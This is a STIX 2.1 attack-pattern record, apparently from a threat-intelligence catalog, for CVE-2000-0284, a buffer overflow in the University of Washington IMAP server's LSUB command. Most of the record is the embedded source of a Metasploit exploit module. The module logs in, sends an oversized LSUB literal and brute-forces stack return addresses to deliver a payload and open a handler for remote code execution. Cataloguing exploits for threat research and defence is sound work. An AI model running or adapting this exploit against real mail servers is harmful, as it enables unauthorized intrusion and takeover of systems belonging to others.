{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--eb0bcb49-6d68-439f-b5d8-053741045405",
    "created": "2024-08-14T16:57:58.698326Z",
    "modified": "2024-08-14T16:57:58.69833Z",
    "name": "UoW IMAP Server LSUB Buffer Overflow",
    "description": " This module exploits a buffer overflow in the 'LSUB' command of the University of Washington IMAP service. This vulnerability can only be exploited with a valid username and password. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/imap/imap_uw_lsub.rb",
            "external_id": "imap_uw_lsub.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2000-0284"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::Brute\n  include Msf::Exploit::Remote::Imap\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'UoW IMAP Server LSUB Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a buffer overflow in the 'LSUB'\n        command of the University of Washington IMAP service.\n        This vulnerability can only be exploited with a valid username\n        and password.\n      },\n      'Author'         => [ 'aushack', 'jduck' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2000-0284' ],\n          [ 'OSVDB', '12037' ],\n          [ 'BID', '1110' ],\n          [ 'EDB', '284' ]\n        ],\n      'Privileged'     => false,\n      'Payload'        =>\n        {\n          'Space'    => 964,\n          'BadChars' => \"\\x00\\x0a\\x0d\\x2f\",\n          'StackAdjustment' => -3500,\n        },\n      'Platform'       => 'linux',\n      'Targets'        =>\n        [\n          # ['RedHat 6.2 - IMAP4rev1 v12.264', { 'Ret' => 0xbffff310 }],\n          [ 'Linux Bruteforce',\n            {\n              'Platform'   => 'linux',\n              'Offset'     => 1064,\n              'Bruteforce' =>\n                {\n                  'Start' => { 'Ret' => 0xbffffdfc },\n                  'Stop'  => { 'Ret' => 0xbfa00000 },\n                  'Step'  => 200\n                }\n            },\n          ]\n        ],\n      'DisclosureDate' => '2000-04-16',\n      'DefaultTarget' => 0))\n  end\n\n  def check\n    connect\n    disconnect\n\n    if (banner =~ /IMAP4rev1 v12\\.264/)\n      return Exploit::CheckCode::Appears\n    end\n    return Exploit::CheckCode::Safe\n\n  end\n\n  def brute_exploit(addresses)\n    print_status(\"Trying 0x%.8x ...\" % addresses['Ret'])\n\n    if (not connect_login)\n      fail_with(Failure::Unknown, \"Unable to log in!\")\n    end\n\n    req = \"a002 LSUB \\\"\\\" {%d}\\r\\n\" % target['Offset']\n    sock.put(req)\n    buf = sock.get_once\n\n    sploit = payload.encoded + rand_text_alphanumeric(64) + [addresses['Ret']].pack('V') + rand_text_alphanumeric(32) + \"\\r\\n\"\n    sock.put(sploit)\n\n    handler\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2000-04-16",
    "x_mitre_platforms": [
        "linux'"
    ]
}